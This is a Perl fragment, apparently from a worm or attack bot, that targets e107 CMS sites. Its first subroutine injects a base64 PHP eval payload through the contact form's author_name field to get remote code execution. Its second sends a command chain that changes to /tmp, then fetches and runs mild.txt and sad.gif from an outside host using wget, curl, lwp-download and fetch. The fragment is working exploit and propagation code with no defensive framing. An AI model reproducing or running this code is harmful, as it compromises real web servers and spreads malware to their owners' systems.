sub e107_rce_query() {
    my $url = $_[0];
    my $code = $_[1];
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=[php]eval(base64_decode('".$code."'))%3Bdie%28%29%3B%5B%2Fphp%5D");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $res = $ua->request($req);
    return $res->content;
}

sub e107_spread_query() {
    my $url = $_[0];
    my $code = "cd /tmp;perl foto83.pl;wget http://3dyorking.com/zencart/r/mild.txt;perl mild.txt;lwp-download http://3dyorking.com/zencart/r/mild.txt;perl mild.txt;curl -O http://3dyorking.com/zencart/r/mild.txt;perl mild.txt;fetch http://3dyorking.com/zencart/r/mild.txt;perl mild.txt;chmod 755 mild.txt;perl mild.txt;wget http://3dyorking.com/zencart/sad.gif;php sad.gif;lwp-download http://3dyorking.com/zencart/sad.gif;php sad.gif;curl -O http://3dyorking.com/zencart/sad.gif;php sad.gif;fetch http://3dyorking.com/zencart/sad.gif;pphp sad.gif";
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=[php]eval(base64_decode('".$code."'))%3Bdie%28%29%3B%5B%2Fphp%5D");
    #$req->content("send-contactus=1&author_name=%5Bphp%5Deval(base64_decode('".$code."'))%3Bdie%28%29%3B%5B%2Fphp%5D");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $res = $ua->request($req);
}

